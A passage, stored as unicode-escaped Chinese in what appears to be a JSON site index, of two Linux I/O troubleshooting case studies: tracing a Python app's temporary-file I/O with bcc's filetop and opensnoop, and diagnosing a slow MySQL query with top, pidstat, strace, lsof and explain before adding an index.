\u8f6f\u4ef6\u5305\u7684\u4e00\u90e8\u5206\uff0c\u57fa\u4e8e Linux \u5185\u6838\u7684 eBPF\uff08extended Berkeley Packet Filters\uff09\u673a\u5236\uff0c\u4e3b\u8981\u8ddf\u8e2a\u5185\u6838\u4e2d\u6587\u4ef6\u7684\u8bfb\u5199\u60c5\u51b5\uff0c\u5e76\u8f93\u51fa\u7ebf\u7a0b ID\uff08TID\uff09\u3001\u8bfb\u5199\u5927\u5c0f\u3001\u8bfb\u5199\u7c7b\u578b\u4ee5\u53ca\u6587\u4ef6\u540d\u79f0\u3002 \u5b89\u88c5\u540e\uff0cbcc \u63d0\u4f9b\u7684\u6240\u6709\u5de5\u5177\uff0c\u5c31\u5168\u90e8\u5b89\u88c5\u5230\u4e86 /usr/share/bcc/tools \u8fd9\u4e2a\u76ee\u5f55\u4e2d\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u7528\u8fd9\u4e2a\u5de5\u5177\uff0c\u89c2\u5bdf\u4e00\u4e0b\u6587\u4ef6\u7684\u8bfb\u5199\u60c5\u51b5\u3002 # \u5207\u6362\u5230\u5de5\u5177\u76ee\u5f55 $ cd /usr/share/bcc/tools # -C \u9009\u9879\u8868\u793a\u8f93\u51fa\u65b0\u5185\u5bb9\u65f6\u4e0d\u6e05\u7a7a\u5c4f\u5e55 $ ./filetop -C TID COMM READS WRITES R_Kb W_Kb T FILE 514 python 0 1 0 2832 R 669.txt 514 python 0 1 0 2490 R 667.txt 514 python 0 1 0 2685 R 671.txt 514 python 0 1 0 2392 R 670.txt 514 python 0 1 0 2050 R 672.txt ... TID COMM READS WRITES R_Kb W_Kb T FILE 514 python 2 0 5957 0 R 651.txt 514 python 2 0 5371 0 R 112.txt 514 python 2 0 4785 0 R 861.txt 514 python 2 0 4736 0 R 213.txt 514 python 2 0 4443 0 R 45.txt \u4f60\u4f1a\u770b\u5230\uff0cfiletop \u8f93\u51fa\u4e86 8 \u5217\u5185\u5bb9\uff0c\u5206\u522b\u662f\u7ebf\u7a0b ID\u3001\u7ebf\u7a0b\u547d\u4ee4\u884c\u3001\u8bfb\u5199\u6b21\u6570\u3001\u8bfb\u5199\u7684\u5927\u5c0f\uff08\u5355\u4f4d KB\uff09\u3001\u6587\u4ef6\u7c7b\u578b\u4ee5\u53ca\u8bfb\u5199\u7684\u6587\u4ef6\u540d\u79f0\u3002 \u8fd9\u4e9b\u5185\u5bb9\u91cc\uff0c\u4f1a\u770b\u5230\u5f88\u591a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u4e0d\u8fc7\u8fd9\u4e0d\u662f\u6211\u4eec\u7684\u91cd\u70b9\uff0c\u6682\u4e14\u5ffd\u7565\u5373\u53ef\u3002\u6211\u4eec\u7684\u91cd\u70b9\uff0c\u662f\u4e00\u4e2a python \u5e94\u7528\uff0c\u6240\u4ee5\u8981\u7279\u522b\u5173\u6ce8 python \u76f8\u5173\u7684\u5185\u5bb9\u3002\u591a\u89c2\u5bdf\u4e00\u4f1a\u513f\uff0c\u4f60\u5c31\u4f1a\u53d1\u73b0\uff0c\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\uff0c\u7ebf\u7a0b\u53f7\u4e3a 514 \u7684 python \u5e94\u7528\u5c31\u4f1a\u5148\u5199\u5165\u5927\u91cf\u7684 txt \u6587\u4ef6\uff0c\u518d\u5927\u91cf\u5730\u8bfb\u3002 \u7ebf\u7a0b\u53f7\u4e3a 514 \u7684\u7ebf\u7a0b\uff0c\u5c5e\u4e8e\u54ea\u4e2a\u8fdb\u7a0b\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u7528 ps \u547d\u4ee4\u67e5\u770b\u3002\u5148\u5728\u7ec8\u7aef\u4e00\u4e2d\uff0c\u6309\u4e0b Ctrl+C \uff0c\u505c\u6b62 filetop \uff1b\u7136\u540e\uff0c\u8fd0\u884c\u4e0b\u9762\u7684 ps \u547d\u4ee4\u3002\u8fd9\u4e2a\u8f93\u51fa\u7684\u7b2c\u4e8c\u5217\u5185\u5bb9\uff0c\u5c31\u662f\u6211\u4eec\u60f3\u77e5\u9053\u7684\u8fdb\u7a0b\u53f7\uff1a $ ps -efT | grep 514 root 12280 514 14626 33 14:47 pts/0 00:00:05 /usr/local/bin/python /app.py \u6211\u4eec\u770b\u5230\uff0c\u8fd9\u4e2a\u7ebf\u7a0b\u6b63\u662f 12280 \u7684\u7ebf\u7a0b\u3002\u7ec8\u4e8e\u53ef\u4ee5\u5148\u677e\u4e00\u53e3\u6c14\uff0c\u4e0d\u8fc7\u8fd8\u6ca1\u5b8c\uff0cfiletop \u53ea\u7ed9\u51fa\u4e86\u6587\u4ef6\u540d\u79f0\uff0c\u5374\u6ca1\u6709\u6587\u4ef6\u8def\u5f84\uff0c\u8fd8\u5f97\u7ee7\u7eed\u627e\u554a\u3002\u6211\u518d\u4ecb\u7ecd\u4e00\u4e2a\u597d\u7528\u7684\u5de5\u5177\uff0copensnoop \u3002\u5b83\u540c\u5c5e\u4e8e bcc \u8f6f\u4ef6\u5305\uff0c\u53ef\u4ee5\u52a8\u6001\u8ddf\u8e2a\u5185\u6838\u4e2d\u7684 open \u7cfb\u7edf\u8c03\u7528\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u627e\u51fa\u8fd9\u4e9b txt \u6587\u4ef6\u7684\u8def\u5f84\u3002\u63a5\u4e0b\u6765\uff0c\u5728\u7ec8\u7aef\u4e00\u4e2d\uff0c\u8fd0\u884c\u4e0b\u9762\u7684 opensnoop \u547d\u4ee4 $ opensnoop 12280 python 6 0 /tmp/9046db9e-fe25-11e8-b13f-0242ac110002/650.txt 12280 python 6 0 /tmp/9046db9e-fe25-11e8-b13f-0242ac110002/651.txt 12280 python 6 0 /tmp/9046db9e-fe25-11e8-b13f-0242ac110002/652.txt \u8fd9\u6b21\uff0c\u901a\u8fc7 opensnoop \u7684\u8f93\u51fa\uff0c\u4f60\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u4e9b txt \u8def\u5f84\u4f4d\u4e8e /tmp \u76ee\u5f55\u4e0b\u3002\u4f60\u8fd8\u80fd\u770b\u5230\uff0c\u5b83\u6253\u5f00\u7684\u6587\u4ef6\u6570\u91cf\uff0c\u6309\u7167\u6570\u5b57\u7f16\u53f7\uff0c\u4ece 0.txt \u4f9d\u6b21\u589e\u5927\u5230 999.txt\uff0c\u8fd9\u53ef\u8fdc\u591a\u4e8e\u524d\u9762\u7528 filetop \u770b\u5230\u7684\u6570\u91cf\u3002 \u7efc\u5408 filetop \u548c opensnoop \uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5206\u6790\u4e86\u3002\u6211\u4eec\u53ef\u4ee5\u5927\u80c6\u731c\u6d4b\uff0c\u6848\u4f8b\u5e94\u7528\u5728\u5199\u5165 1000 \u4e2a txt \u6587\u4ef6\u540e\uff0c\u53c8\u628a\u8fd9\u4e9b\u5185\u5bb9\u8bfb\u5230\u5185\u5b58\u4e2d\u8fdb\u884c\u5904\u7406\u3002\u6211\u4eec\u6765\u68c0\u67e5\u4e00\u4e0b\uff0c\u8fd9\u4e2a\u76ee\u5f55\u4e2d\u662f\u4e0d\u662f\u771f\u7684\u6709 1000 \u4e2a\u6587\u4ef6\uff1a $ ls /tmp/9046db9e-fe25-11e8-b13f-0242ac110002 | wc -l ls: cannot access '/tmp/9046db9e-fe25-11e8-b13f-0242ac110002': No such file or directory 0 \u64cd\u4f5c\u540e\u5374\u53d1\u73b0\uff0c\u76ee\u5f55\u5c45\u7136\u4e0d\u5b58\u5728\u4e86\u3002\u600e\u4e48\u56de\u4e8b\u5462\uff1f\u6211\u4eec\u56de\u5230 opensnoop \u518d\u89c2\u5bdf\u4e00\u4f1a\u513f\uff1a $ opensnoop 12280 python 6 0 /tmp/defee970-fe25-11e8-b13f-0242ac110002/261.txt 12280 python 6 0 /tmp/defee970-fe25-11e8-b13f-0242ac110002/840.txt 12280 python 6 0 /tmp/defee970-fe25-11e8-b13f-0242ac110002/136.txt \u539f\u6765\uff0c\u8fd9\u65f6\u7684\u8def\u5f84\u5df2\u7ecf\u53d8\u6210\u4e86\u53e6\u4e00\u4e2a\u76ee\u5f55\u3002\u8fd9\u8bf4\u660e\uff0c\u8fd9\u4e9b\u76ee\u5f55\u90fd\u662f\u5e94\u7528\u7a0b\u5e8f\u52a8\u6001\u751f\u6210\u7684\uff0c\u7528\u5b8c\u5c31\u5220\u4e86\u3002\u7ed3\u5408\u524d\u9762\u7684\u6240\u6709\u5206\u6790\uff0c\u6211\u4eec\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\uff0c\u6848\u4f8b\u5e94\u7528\u4f1a\u52a8\u6001\u751f\u6210\u4e00\u6279\u6587\u4ef6\uff0c\u7528\u6765\u4e34\u65f6\u5b58\u50a8\u6570\u636e\uff0c\u7528\u5b8c\u5c31\u4f1a\u5220\u9664\u5b83\u4eec\u3002\u4f46\u4e0d\u5e78\u7684\u662f\uff0c\u6b63\u662f\u8fd9\u4e9b\u6587\u4ef6\u8bfb\u5199\uff0c\u5f15\u53d1\u4e86 I/O \u7684\u6027\u80fd\u74f6\u9888\uff0c\u5bfc\u81f4\u6574\u4e2a\u5904\u7406\u8fc7\u7a0b\u975e\u5e38\u6162\u3002","title":"Python\u5bfc\u81f4IO\u6162\u6848\u4f8b"},{"location":"system/linux/IO/SQL%E6%9F%A5%E8%AF%A2%E6%85%A2%E6%A1%88%E4%BE%8B/","text":"\u4e00\u4e2aSQL\u67e5\u8be2\u898115\u79d2\uff0c\u8fd9\u662f\u600e\u4e48\u56de\u4e8b\uff1f $ curl http://192.168.0.10:10000/products/geektime Got data: () in 15.364538192749023 sec \u63a5\u53e3\u8fd4\u56de\u7684\u662f\u7a7a\u6570\u636e\uff0c\u800c\u4e14\u5904\u7406\u65f6\u95f4\u8d85\u8fc7 15 \u79d2\u3002\u8fd9\u4e48\u6162\u7684\u54cd\u5e94\u901f\u5ea6\u8ba9\u4eba\u65e0\u6cd5\u5fcd\u53d7\uff0c\u5230\u5e95\u51fa\u4e86\u4ec0\u4e48\u95ee\u9898\u5462\uff1f \u4e3a\u4e86\u907f\u514d\u5728\u5206\u6790\u8fc7\u7a0b\u4e2d\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u7ed3\u675f\uff0c\u628a curl \u547d\u4ee4\u653e\u5230\u4e00\u4e2a\u5faa\u73af\u91cc\u6267\u884c\u3002\u540c\u65f6\uff0c\u4e3a\u4e86\u907f\u514d\u7ed9\u7cfb\u7edf\u8fc7\u5927\u538b\u529b\uff0c\u6211\u4eec\u8bbe\u7f6e\u5728\u6bcf\u6b21\u67e5\u8be2\u540e\uff0c\u90fd\u5148\u7b49\u5f85 5 \u79d2\uff0c\u7136\u540e\u518d\u5f00\u59cb\u65b0\u7684\u8bf7\u6c42\u3002\u6240\u4ee5\uff0c\u4f60\u53ef\u4ee5\u5728\u7ec8\u7aef\u4e8c\u4e2d\uff0c\u7ee7\u7eed\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff1a $ while true; do curl http://192.168.0.10:10000/products/geektime; sleep 5; done \u63a5\u4e0b\u6765\uff0c\u91cd\u65b0\u56de\u5230\u7ec8\u7aef\u4e00\u4e2d\uff0c\u5206\u6790\u63a5\u53e3\u54cd\u5e94\u901f\u5ea6\u6162\u7684\u539f\u56e0\u3002\u4e0d\u8fc7\uff0c\u91cd\u56de\u7ec8\u7aef\u4e00\u540e\uff0c\u4f60\u4f1a\u53d1\u73b0\u7cfb\u7edf\u54cd\u5e94\u4e5f\u660e\u663e\u53d8\u6162\u4e86\uff0c\u968f\u4fbf\u6267\u884c\u4e00\u4e2a\u547d\u4ee4\uff0c\u90fd\u5f97\u505c\u987f\u4e00\u4f1a\u513f\u624d\u80fd\u770b\u5230\u8f93\u51fa\u3002\u8fd9\u8ddf\u4e0a\u4e00\u8282\u7684\u73b0\u8c61\u5f88\u7c7b\u4f3c\uff0c\u770b\u6765\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u89c2\u5bdf\u4e00\u4e0b\u7cfb\u7edf\u7684\u8d44\u6e90\u4f7f\u7528\u60c5\u51b5\uff0c\u6bd4\u5982 CPU\u3001\u5185\u5b58\u548c\u78c1\u76d8 I/O \u7b49\u7684\u60c5\u51b5\u3002 $ top top - 12:02:15 up 6 days, 8:05, 1 user, load average: 0.66, 0.72, 0.59 Tasks: 137 total, 1 running, 81 sleeping, 0 stopped, 0 zombie %Cpu0 : 0.7 us, 1.3 sy, 0.0 ni, 35.9 id, 62.1 wa, 0.0 hi, 0.0 si, 0.0 st %Cpu1 : 0.3 us, 0.7 sy, 0.0 ni, 84.7 id, 14.3 wa, 0.0 hi, 0.0 si, 0.0 st KiB Mem : 8169300 total, 7238472 free, 546132 used, 384696 buff/cache KiB Swap: 0 total, 0 free, 0 used. 7316952 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 27458 999 20 0 833852 57968 13176 S 1.7 0.7 0:12.40 mysqld 27617 root 20 0 24348 9216 4692 S 1.0 0.1 0:04.40 python 1549 root 20 0 236716 24568 9864 S 0.3 0.3 51:46.57 python3 22421 root 20 0 0 0 0 I 0.3 0.0 0:01.16 kworker/u \u89c2\u5bdf top \u7684\u8f93\u51fa\uff0c\u4e24\u4e2a CPU \u7684 iowait \u90fd\u6bd4\u8f83\u9ad8\uff0c\u7279\u522b\u662f CPU0\uff0ciowait \u5df2\u7ecf\u8d85\u8fc7 60%\u3002\u800c\u5177\u4f53\u5230\u5404\u4e2a\u8fdb\u7a0b\uff0c CPU \u4f7f\u7528\u7387\u5e76\u4e0d\u9ad8\uff0c\u6700\u9ad8\u7684\u4e5f\u53ea\u6709 1.7%\u3002\u65e2\u7136 CPU \u7684\u5acc\u7591\u4e0d\u5927\uff0c\u90a3\u95ee\u9898\u5e94\u8be5\u8fd8\u662f\u51fa\u5728\u4e86 I/O \u4e0a\u3002 \u6211\u4eec\u4ecd\u7136\u5728\u7b2c\u4e00\u4e2a\u7ec8\u7aef\uff0c\u6309\u4e0b Ctrl+C\uff0c\u505c\u6b62 top \u547d\u4ee4\uff1b\u7136\u540e\uff0c\u6267\u884c\u4e0b\u9762\u7684 iostat \u547d\u4ee4\uff0c\u770b\u770b\u6709\u6ca1\u6709 I/O \u6027\u80fd\u95ee\u9898\uff1a # -d\u9009\u9879\u8868\u793a\u5c55\u793a\u8fdb\u7a0b\u7684I/O\u60c5\u51b5 $ pidstat -d 1 12:04:11 UID PID kB_rd/s kB_wr/s kB_ccwr/s iodelay Command 12:04:12 999 27458 32640.00 0.00 0.00 0 mysqld 12:04:12 0 27617 4.00 4.00 0.00 3 python 12:04:12 0 27864 0.00 4.00 0.00 0 systemd-journal \u4ece pidstat \u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u5230\uff0cPID \u4e3a 27458 \u7684 mysqld \u8fdb\u7a0b\u6b63\u5728\u8fdb\u884c\u5927\u91cf\u7684\u8bfb\uff0c\u800c\u4e14\u8bfb\u53d6\u901f\u5ea6\u662f 32 MB/s\uff0c\u8ddf\u521a\u624d iostat \u7684\u53d1\u73b0\u4e00\u81f4\u3002\u4e24\u4e2a\u7ed3\u679c\u4e00\u5bf9\u6bd4\uff0c\u81ea\u7136\u5c31\u627e\u5230\u4e86\u78c1\u76d8 I/O \u74f6\u9888\u7684\u6839\u6e90\uff0c\u5373 mysqld \u8fdb\u7a0b\u3002 \u4e3a\u4ec0\u4e48 mysqld \u4f1a\u53bb\u8bfb\u53d6\u5927\u91cf\u7684\u78c1\u76d8\u6570\u636e\u5462\uff1f\u8fd9\u6709\u53ef\u80fd\u662f\u4e2a\u6162\u67e5\u8be2\u95ee\u9898\u3002\u6162\u67e5\u8be2\u7684\u73b0\u8c61\u5927\u591a\u662f CPU \u4f7f\u7528\u7387\u9ad8\uff08\u6bd4\u5982 100% \uff09\uff0c\u4f46\u8fd9\u91cc\u770b\u5230\u7684\u5374\u662f I/O \u95ee\u9898\uff0c\u6211\u4eec\u6709\u5fc5\u8981\u5206\u6790\u4e00\u4e0b MySQL \u8bfb\u53d6\u7684\u6570\u636e\u3002 \u8981\u5206\u6790\u8fdb\u7a0b\u7684\u6570\u636e\u8bfb\u53d6\uff0c\u5f53\u7136\u8fd8\u8981\u9760 strace+ lsof \u7ec4\u5408\u3002 \u63a5\u4e0b\u6765\uff0c\u8fd8\u662f\u5728\u7ec8\u7aef\u4e00\u4e2d\uff0c\u6267\u884c strace \u547d\u4ee4\uff0c\u5e76\u4e14\u6307\u5b9a mysqld \u7684\u8fdb\u7a0b\u53f7 27458\u3002MySQL \u662f\u4e00\u4e2a\u591a\u7ebf\u7a0b\u7684\u6570\u636e\u5e93\u5e94\u7528\uff0c\u4e3a\u4e86\u4e0d\u6f0f\u6389\u8fd9\u4e9b\u7ebf\u7a0b\u7684\u6570\u636e\u8bfb\u53d6\u60c5\u51b5\uff0c\u6267\u884c stace \u547d\u4ee4\u65f6\uff0c\u52a0\u4e0a -f \u53c2\u6570\uff1a $ strace -f -p 27458 [pid 28014] read(38, \"934EiwT363aak7VtqF1mHGa4LL4Dhbks\"..., 131072) = 131072 [pid 28014] read(38, \"hSs7KBDepBqA6m4ce6i6iUfFTeG9Ot9z\"..., 20480) = 20480 [pid 28014] read(38, \"NRhRjCSsLLBjTfdqiBRLvN9K6FRfqqLm\"..., 131072) = 131072 [pid 28014] read(38, \"AKgsik4BilLb7y6OkwQUjjqGeCTQTaRl\"..., 24576) = 24576 [pid 28014] read(38, \"hFMHx7FzUSqfFI22fQxWCpSnDmRjamaW\"..., 131072) = 131072 [pid 28014] read(38, \"ajUzLmKqivcDJSkiw7QWf2ETLgvQIpfC\"..., 20480) = 20480 \u7ebf\u7a0b 28014 \u6b63\u5728\u8bfb\u53d6\u5927\u91cf\u6570\u636e\uff0c\u4e14\u8bfb\u53d6\u6587\u4ef6\u7684\u63cf\u8ff0\u7b26\u7f16\u53f7\u4e3a 38\u3002\u8fd9\u513f\u7684 38 \u53c8\u5bf9\u5e94\u7740\u54ea\u4e2a\u6587\u4ef6\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u6267\u884c\u4e0b\u9762\u7684 lsof \u547d\u4ee4\uff0c\u5e76\u4e14\u6307\u5b9a\u7ebf\u7a0b\u53f7 28014 \uff0c\u5177\u4f53\u67e5\u770b\u8fd9\u4e2a\u53ef\u7591\u7ebf\u7a0b\u548c\u53ef\u7591\u6587\u4ef6\uff1a $ lsof -p 28014 lsof \u5e76\u6ca1\u6709\u7ed9\u51fa\u4efb\u4f55\u8f93\u51fa\u3002\u67e5\u770b lsof \u547d\u4ee4\u7684\u8fd4\u56de\u503c\uff0c\u8fd9\u4e2a\u547d\u4ee4\u7684\u6267\u884c\u5931\u8d25\u4e86\u3002 $ echo $? 1 -p \u53c2\u6570\u9700\u8981\u6307\u5b9a\u8fdb\u7a0b\u53f7\uff0c\u800c\u521a\u624d\u4f20\u5165\u7684\u662f\u7ebf\u7a0b\u53f7\uff0c\u6240\u4ee5 lsof \u5931\u8d25\u4e86\u3002 \u628a\u7ebf\u7a0b\u53f7\u6362\u6210\u8fdb\u7a0b\u53f7\uff0c\u7ee7\u7eed\u6267\u884c lsof \u547d\u4ee4\uff1a $ lsof -p 27458 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME ... mysqld 27458 999 38u REG 8,1 512440000 2601895 /var/lib/mysql/test/products.MYD \u5f97\u5230\u4e86 lsof \u7684\u8f93\u51fa\u3002\u4ece\u8f93\u51fa\u4e2d\u53ef\u4ee5\u770b\u5230\uff0c mysqld \u8fdb\u7a0b\u786e\u5b9e\u6253\u5f00\u4e86\u5927\u91cf\u6587\u4ef6\uff0c\u800c\u6839\u636e\u6587\u4ef6\u63cf\u8ff0\u7b26\uff08FD\uff09\u7684\u7f16\u53f7\uff0c\uff0c\u63cf\u8ff0\u7b26\u4e3a 38 \u7684\u662f\u4e00\u4e2a\u8def\u5f84\u4e3a /var/lib/mysql/test/products.MYD \u7684\u6587\u4ef6\u3002 38 \u540e\u9762\u7684 u \u8868\u793a\uff0c mysqld \u4ee5\u8bfb\u5199\u7684\u65b9\u5f0f\u8bbf\u95ee\u6587\u4ef6\u3002\uff1a MYD \u6587\u4ef6\uff0c\u662f MyISAM \u5f15\u64ce\u7528\u6765\u5b58\u50a8\u8868\u6570\u636e\u7684\u6587\u4ef6\uff1b \u6587\u4ef6\u540d\u5c31\u662f\u6570\u636e\u8868\u7684\u540d\u5b57\uff1b \u800c\u8fd9\u4e2a\u6587\u4ef6\u7684\u7236\u76ee\u5f55\uff0c\u4e5f\u5c31\u662f\u6570\u636e\u5e93\u7684\u540d\u5b57\u3002 mysqld \u5728\u8bfb\u53d6\u6570\u636e\u5e93 test \u4e2d\u7684 products \u8868\u3002\u5b9e\u9645\u4e0a\uff0c\u53ef\u4ee5\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u67e5\u770b mysqld \u5728\u7ba1\u7406\u6570\u636e\u5e93 test \u65f6\u7684\u5b58\u50a8\u6587\u4ef6\u3002\u4e0d\u8fc7\u8981\u6ce8\u610f\uff0c\u7531\u4e8e MySQL \u8fd0\u884c\u5728\u5bb9\u5668\u4e2d\uff0c\u4f60\u9700\u8981\u901a\u8fc7 docker exec \u5230\u5bb9\u5668\u4e2d\u67e5\u770b\uff1a $ docker exec -it mysql ls /var/lib/mysql/test/ db.opt products.MYD products.MYI products.frm \u4ece\u8fd9\u91cc\u4f60\u53ef\u4ee5\u53d1\u73b0\uff0c/var/lib/mysql/test/ \u76ee\u5f55\u4e2d\u6709\u56db\u4e2a\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u7684\u4f5c\u7528\u5206\u522b\u662f\uff1a MYD \u6587\u4ef6\u7528\u6765\u5b58\u50a8\u8868\u7684\u6570\u636e\uff1b MYI \u6587\u4ef6\u7528\u6765\u5b58\u50a8\u8868\u7684\u7d22\u5f15\uff1b frm \u6587\u4ef6\u7528\u6765\u5b58\u50a8\u8868\u7684\u5143\u4fe1\u606f\uff08\u6bd4\u5982\u8868\u7ed3\u6784\uff09\uff1b opt \u6587\u4ef6\u5219\u7528\u6765\u5b58\u50a8\u6570\u636e\u5e93\u7684\u5143\u4fe1\u606f\uff08\u6bd4\u5982\u5b57\u7b26\u96c6\u3001\u5b57\u7b26\u6821\u9a8c\u89c4\u5219\u7b49\uff09\u3002 \u8fd9\u4e9b\u6587\u4ef6\u5230\u5e95\u662f\u4e0d\u662f mysqld \u6b63\u5728\u4f7f\u7528\u7684\u6570\u636e\u5e93\u6587\u4ef6\u5462\uff1f\u6709\u6ca1\u6709\u53ef\u80fd\u662f\u4e0d\u518d\u4f7f\u7528\u7684\u65e7\u6570\u636e\u5462\uff1f\u5176\u5b9e\uff0c\u8fd9\u4e2a\u5f88\u5bb9\u6613\u786e\u8ba4\uff0c\u67e5\u4e00\u4e0b mysqld \u914d\u7f6e\u7684\u6570\u636e\u8def\u5f84\u5373\u53ef\u3002\u4f60\u53ef\u4ee5\u5728\u7ec8\u7aef\u4e00\u4e2d\uff0c\u7ee7\u7eed\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff1a $ docker exec -i -t mysql mysql -e 'show global variables like \"%datadir%\";' +---------------+-----------------+ | Variable_name | Value | +---------------+-----------------+ | datadir | /var/lib/mysql/ | +---------------+-----------------+ \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\uff0c/var/lib/mysql/ \u786e\u5b9e\u662f mysqld \u6b63\u5728\u4f7f\u7528\u7684\u6570\u636e\u5b58\u50a8\u76ee\u5f55\u3002\u521a\u624d\u5206\u6790\u5f97\u51fa\u7684\u6570\u636e\u5e93 test \u548c\u6570\u636e\u8868 products \uff0c\u90fd\u662f\u6b63\u5728\u4f7f\u7528\u3002 \u65e2\u7136\u5df2\u7ecf\u627e\u51fa\u4e86\u6570\u636e\u5e93\u548c\u8868\uff0c\u63a5\u4e0b\u6765\u8981\u505a\u7684\uff0c\u5c31\u662f\u5f04\u6e05\u695a\u6570\u636e\u5e93\u4e2d\u6b63\u5728\u6267\u884c\u4ec0\u4e48\u6837\u7684 SQL \u4e86\u3002\u6211\u4eec\u7ee7\u7eed\u5728\u7ec8\u7aef\u4e00\u4e2d\uff0c\u8fd0\u884c\u4e0b\u9762\u7684 docker exec \u547d\u4ee4\uff0c\u8fdb\u5165 MySQL \u7684\u547d\u4ee4\u884c\u754c\u9762\uff1a \u4e0d\u8fc7\uff0c\u4e3a\u4e86\u4fdd\u8bc1 SQL \u8bed\u53e5\u4e0d\u622a\u65ad\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u6267\u884c show full processlist \u547d\u4ee4\u3002\u5982\u679c\u4e00\u5207\u6b63\u5e38\uff0c\u4f60\u5e94\u8be5\u53ef\u4ee5\u770b\u5230\u5982\u4e0b\u8f93\u51fa\uff1a mysql> show full processlist; +----+------+-----------------+------+---------+------+--------------+-----------------------------------------------------+ | Id | User | Host | db | Command | Time | State | Info | +----+------+-----------------+------+---------+------+--------------+-----------------------------------------------------+ | 27 | root | localhost | test | Query | 0 | init | show full processlist | | 28 | root | 127.0.0.1:42262 | test | Query | 1 | Sending data | select * from products where productName='geektime' | +----+------+-----------------+------+---------+------+--------------+-----------------------------------------------------+ 2 rows in set (0.00 sec) \u8fd9\u4e2a\u8f93\u51fa\u4e2d\uff0c db \u8868\u793a\u6570\u636e\u5e93\u7684\u540d\u5b57\uff1b Command \u8868\u793a SQL \u7c7b\u578b\uff1b Time \u8868\u793a\u6267\u884c\u65f6\u95f4\uff1b State \u8868\u793a\u72b6\u6001\uff1b \u800c Info \u5219\u5305\u542b\u4e86\u5b8c\u6574\u7684 SQL \u8bed\u53e5\u3002 \u591a\u6267\u884c\u51e0\u6b21 show full processlist \u547d\u4ee4\uff0c\u4f60\u53ef\u770b\u5230 select * from products where productName=\u2018geektime\u2019 \u8fd9\u6761 SQL \u8bed\u53e5\u7684\u6267\u884c\u65f6\u95f4\u6bd4\u8f83\u957f\u3002 \u5176\u5b9e\uff0cMySQL \u5185\u7f6e\u7684 explain \u547d\u4ee4\uff0c\u5c31\u53ef\u4ee5\u5e2e\u4f60\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u7ee7\u7eed\u5728 MySQL \u7ec8\u7aef\u4e2d\uff0c\u8fd0\u884c\u4e0b\u9762\u7684 explain \u547d\u4ee4\uff1a # \u5207\u6362\u5230test\u5e93 mysql> use test; # \u6267\u884cexplain\u547d\u4ee4 mysql> explain select * from products where productName='geektime'; +----+-------------+----------+------+---------------+------+---------+------+-------+-------------+ | id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra | +----+-------------+----------+------+---------------+------+---------+------+-------+-------------+ | 1 | SIMPLE | products | ALL | NULL | NULL | NULL | NULL | 10000 | Using where | +----+-------------+----------+------+---------------+------+---------+------+-------+-------------+ 1 row in set (0.00 sec) \u89c2\u5bdf\u8fd9\u6b21\u7684\u8f93\u51fa\u3002\u8fd9\u4e2a\u754c\u9762\u4e2d\uff0c\u6709\u51e0\u4e2a\u6bd4\u8f83\u91cd\u8981\u7684\u5b57\u6bb5\u9700\u8981\u4f60\u6ce8\u610f\uff0c\u6211\u5c31\u4ee5\u8fd9\u4e2a\u8f93\u51fa\u4e3a\u4f8b\uff0c\u5206\u522b\u89e3\u91ca\u4e00\u4e0b\uff1a select_type \u8868\u793a\u67e5\u8be2\u7c7b\u578b\uff0c\u800c\u8fd9\u91cc\u7684 SIMPLE \u8868\u793a\u6b64\u67e5\u8be2\u4e0d\u5305\u62ec UNION \u67e5\u8be2\u6216\u8005\u5b50\u67e5\u8be2\uff1b table \u8868\u793a\u6570\u636e\u8868\u7684\u540d\u5b57\uff0c\u8fd9\u91cc\u662f products\uff1b type \u8868\u793a\u67e5\u8be2\u7c7b\u578b\uff0c\u8fd9\u91cc\u7684 ALL \u8868\u793a\u5168\u8868\u67e5\u8be2\uff0c\u4f46\u7d22\u5f15\u67e5\u8be2\u5e94\u8be5\u662f index \u7c7b\u578b\u624d\u5bf9\uff1b possible_keys \u8868\u793a\u53ef\u80fd\u9009\u7528\u7684\u7d22\u5f15\uff0c\u8fd9\u91cc\u662f NULL\uff1b key \u8868\u793a\u786e\u5207\u4f1a\u4f7f\u7528\u7684\u7d22\u5f15\uff0c\u8fd9\u91cc\u4e5f\u662f NULL\uff1b rows \u8868\u793a\u67e5\u8be2\u626b\u63cf\u7684\u884c\u6570\uff0c\u8fd9\u91cc\u662f 10000\u3002 \u6839\u636e\u8fd9\u4e9b\u4fe1\u606f\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\uff0c\u8fd9\u6761\u67e5\u8be2\u8bed\u53e5\u538b\u6839\u513f\u6ca1\u6709\u4f7f\u7528\u7d22\u5f15\uff0c\u6240\u4ee5\u67e5\u8be2\u65f6\uff0c\u4f1a\u626b\u63cf\u5168\u8868\uff0c\u5e76\u4e14\u626b\u63cf\u884c\u6570\u9ad8\u8fbe 10000 \u884c\u3002\u54cd\u5e94\u901f\u5ea6\u90a3\u4e48\u6162\u4e5f\u5c31\u96be\u602a\u4e86\u3002 mysql> CREATE INDEX products_index ON products (productName(64)); Query OK, 10000 rows affected (14.45 sec) Records: 10000 Duplicates: 0 Warnings: 0 